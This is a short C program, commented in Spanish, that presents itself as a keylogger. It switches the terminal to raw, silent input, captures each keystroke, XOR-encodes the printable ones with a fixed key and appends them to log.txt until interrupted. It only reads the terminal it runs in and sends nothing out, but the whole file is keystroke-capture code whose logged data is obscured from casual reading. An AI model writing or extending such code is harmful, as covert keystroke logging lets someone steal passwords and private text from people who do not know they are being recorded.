#include <stdio.h>                                                          #include <stdlib.h>                                                         #include <termios.h>                                                        #include <unistd.h>                                                         #include <signal.h>                                                         #include <ctype.h>  // Para verificar si un carácter es imprimible                                                                                      #define LOG_FILE "log.txt"                                                  #define XOR_KEY 0xAA  // Clave para cifrado simple                                                                                                      FILE *file; // Puntero al archivo global                                                                                                                /**                                                                          * Captura una tecla sin necesidad de presionar Enter.                       */                                                                         char get_key() {                                                                struct termios oldt, newt;                                                  char ch;                                                                                                                                                // Guardar configuración actual del terminal                                tcgetattr(STDIN_FILENO, &oldt);                                             newt = oldt;                                                                                                                                            // Desactivar buffer de línea y eco                                         newt.c_lflag &= ~(ICANON | ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);

    // Capturar una tecla
    ch = getchar();

    // Restaurar configuración original
    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
    return ch;
}

/**
 * Manejador de señal SIGINT (CTRL+C).
 * Se asegura de cerrar el archivo correctamente antes de salir.
 */
void handle_exit(int sig) {
    if (file) {
        fclose(file);
    }
    printf("\n[+] Keylogger detenido. Datos guardados en %s\n", LOG_FILE);
    exit(0);
}

int main() {
    char key;

    // Configurar el manejador de señal para CTRL+C
    signal(SIGINT, handle_exit);

    // Abrir archivo en modo "append" (agregar datos sin sobrescribir)
    file = fopen(LOG_FILE, "a");
    if (!file) {
        perror("Error al abrir el archivo de log");
        return 1;
    }

    printf("[+] Keylogger en ejecución... (CTRL+C para salir)\n");

    while (1) {
        key = get_key();

        // Solo guardar caracteres imprimibles para evitar datos corruptos
        if (isprint(key)) {
            fputc(key ^ XOR_KEY, file);
            fflush(file);  // Asegurar que los datos se guarden inmediatamente
        }
    }

    return 0;
}
